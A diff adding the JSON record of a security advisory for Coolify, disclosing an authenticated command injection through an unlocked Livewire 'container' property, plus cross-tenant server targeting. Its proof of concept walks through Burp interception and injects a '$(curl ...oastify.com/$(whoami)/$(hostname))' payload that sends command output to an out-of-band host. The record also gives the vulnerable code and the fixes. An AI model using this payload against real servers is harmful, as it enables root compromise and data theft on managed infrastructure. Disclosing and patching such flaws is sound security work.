@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-6r3g-w7x8-54fj",
+  "repo": {
+    "cve_id": "CVE-2026-34057",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nAn authenticated command injection vulnerability in the Database Import functionality allows users with team membership (lowest privilege role) to execute arbitrary commands as root on managed servers. The `$container` Livewire public property is interpolated directly into shell commands (`docker exec`, `docker cp`) without sanitization, and can be modified by any client via the Livewire wire protocol because it lacks the #[Locked] attribute. \r\n\r\nThis is a bypass of the fix for `GHSA-q33h-22xm-4cgh`, which added `validateServerPath()` to sanitize file path inputs but left the $container parameter completely unvalidated.\r\n\r\n### Details\r\n#### Vulnerable File: `app/Livewire/Project/Database/Import.php` \r\n#### Vulnerable Code (Multiple Locations)\r\n\r\nLine 138 (unlocked public property):\r\n\r\n```php\r\npublic string $container;  // No #[Locked] attribute - client-modifiable\r\n```\r\n\r\nLine 435 (upload path):\r\n\r\n```php\r\n$this->importCommands[] = \"docker cp {$tmpPath} {$this->container}:{$tmpPath}\";\r\n```\r\n\r\nLine 445 (custom location path):\r\n\r\n```php\r\n$this->importCommands[] = \"docker cp {$escapedCustomLocation} {$this->container}:{$tmpPath}\";\r\n```\r\n\r\nLine 460 (script copy):\r\n\r\n```php\r\n$this->importCommands[] = \"docker cp {$scriptPath} {$this->container}:{$scriptPath}\";\r\n```\r\n\r\nLine 462 (restore execution):\r\n\r\n```php\r\n$this->importCommands[] = \"docker exec {$this->container} sh -c '{$scriptPath}'\";\r\n```\r\n\r\nIn Livewire 3, all public properties on a component can be modified by the client through the `updates` field in `POST /livewire/update` requests, unless the property has the `#[Locked]` attribute. The `$container` property lacks this attribute and is interpolated directly into shell commands executed via `remote_process()` on managed servers over SSH.\r\n\r\nThe fix for GHSA-q33h-22xm-4cgh (commit `9113ed714`) added `validateServerPath()` to reject shell metacharacters like `$(`, `;`,    `in the` $customLocation `parameter. However, the` $container `parameter was overlooked and has no validation whatsoever. An attacker can inject arbitrary commands using` $()` command substitution.\r\n\r\n**Contrast with properly secured component:** `app/Livewire/Project/Shared/ExecuteContainerCommand.php` in the same codebase validates container names with regex (`/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/`), verifies against an allowlist of running containers, and checks server ownership. The Import component has none of these protections.\r\n\r\n**Cross-Tenant Escalation (line 184):**\r\n\r\n```php\r\npublic function server()\r\n{\r\n    return Server::find($this->serverId);  // No team scoping\r\n}\r\n```\r\n\r\nThe `$serverId` property also lacks `#[Locked]` and uses `Server::find()` with no team scoping. Server IDs are sequential integers. An attacker can override `serverId` to target servers belonging to other teams while keeping `resourceId`/`resourceType` pointing to their own resource to pass the authorization check on line 410.\r\n\r\n### PoC\r\n\r\n**Prerequisites:**\r\n\r\n- Coolify v4.0.0-beta.468 or earlier\r\n- Authenticated user with team membership (any role, including `member` - the lowest privilege)\r\n- At least one database resource accessible to the user\r\n- Burp Suite or any HTTP proxy\r\n\r\n**Steps to reproduce:**\r\n\r\n1. Log in as a low-privilege team member and switch to a team that has a database resource.\r\n<img width=\"1902\" height=\"812\" alt=\"image\" src=\"https://github.com/user-attachments/assets/43b763bd-65a9-484a-a544-549cfd1b7371\" />\r\n\r\n2. Navigate to the database's Import Backup page (e.g., `/project/{project}/environment/{env}/database/{db}/import-backup`).\r\n<img width=\"1891\" height=\"957\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8dd7afc6-5b83-4a70-8e27-1d473f68ad60\" />\r\n\r\n3. Select \"Restore from File\", enter `/etc/hostname` in the custom location field, and click \"Restore Database from File\". Enter your password in the confirmation dialog.\r\n<img width=\"1907\" height=\"1000\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ef0acbaf-b9af-48b6-86fd-bb4bd4491827\" />\r\n\r\n<img width=\"1897\" height=\"991\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5c22e496-004d-45e8-8073-da6d89ccf6a3\" />\r\n\r\n\r\n4. Intercept the resulting `POST /livewire/update` request in Burp Suite. Look for the request containing `\"method\":\"runImport\"` and `\"name\":\"project.database.import\"`.\r\n\r\n<img width=\"1895\" height=\"943\" alt=\"image\" src=\"https://github.com/user-attachments/assets/10b2cceb-95e3-465d-a693-50292525ea03\" />\r\n\r\n5. In Burp Repeater, modify the `updates` object in the JSON body to inject the `container` property:\r\n\r\n```json\r\n\"updates\": {\r\n    \"customLocation\": \"/etc/hostname\",\r\n    \"container\": \"$(curl http://COLLABORATOR_ID.oastify.com/$(whoami)/$(hostname))\"\r\n}\r\n```\r\n<img width=\"1917\" height=\"980\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3ced0596-97fa-44e0-9266-9bf7e16e2ab2\" />\r\n\r\n1. Send the request. The server responds with HTTP 200, `\"importRunning\":true`, and a non-null `activityId`, confirming the commands were dispatched to the job queue.\r\n2. Burp Collaborator receives an HTTP callback confirming root RCE:\r\n\r\n```\r\nGET /root/c7cd43d76693 HTTP/1.1\r\nHost: COLLABORATOR_ID.oastify.com\r\nUser-Agent: curl/7.88.1\r\n```\r\n<img width=\"1917\" height=\"709\" alt=\"image\" src=\"https://github.com/user-attachments/assets/87c84ee2-cf07-4471-9616-acb053448918\" />\r\n\r\n\r\nThe path `/root/c7cd43d76693` contains the output of `whoami` (root) and `hostname` (c7cd43d76693), confirming arbitrary command execution as root on the managed server.\r\n\r\n### Impact\r\n**Severity:** Critical (CVSS 9.9)\r\n\r\n**Impact:**\r\n\r\n- **Remote Code Execution:** Attackers can execute arbitrary commands on managed servers\r\n- **Root Privilege:** All commands execute as root due to Coolify's SSH execution model\r\n- **Bypass of Previous Fix:** The patch for GHSA-q33h-22xm-4cgh validated file path inputs but left the container name parameter completely unsanitized\r\n- **Cross-Tenant Escalation:** By overriding `serverId`, an attacker can target servers belonging to other teams on the same Coolify instance\r\n- **Full Server Compromise:** Access to SSH private keys, database credentials, application secrets, and all data on managed infrastructure\r\n- **Lateral Movement:** Coolify stores SSH keys for every connected server, enabling pivot to all managed hosts\r\n\r\n### Recommended Fix\r\nAdd `#[Locked]` to all security-sensitive properties:\r\n\r\n```php\r\nuse Livewire\\Attributes\\Locked;\r\n\r\n#[Locked]\r\npublic string $container;\r\n\r\n#[Locked]\r\npublic ?int $serverId = null;\r\n```\r\n\r\nAdditionally, validate the container name before use in shell commands, consistent with `ExecuteContainerCommand.php`:\r\n\r\n```php\r\nif (!preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/', $this->container)) {\r\n    $this->dispatch('error', 'Invalid container name.');\r\n    return true;\r\n}\r\n```\r\n\r\nScope server lookups to the current team:\r\n\r\n```php\r\nreturn Server::ownedByCurrentTeam()->find($this->serverId);\r\n```",
+    "ghsa_id": "GHSA-6r3g-w7x8-54fj",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-6r3g-w7x8-54fj",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6r3g-w7x8-54fj"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34057"
+      }
+    ],
+    "published_at": "2026-07-02T16:37:57Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authenticated Remote Code Execution via Command Injection in Database Import Container Name",
+    "updated_at": "2026-07-02T16:37:57Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": "<= 4.0.0-beta.470"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
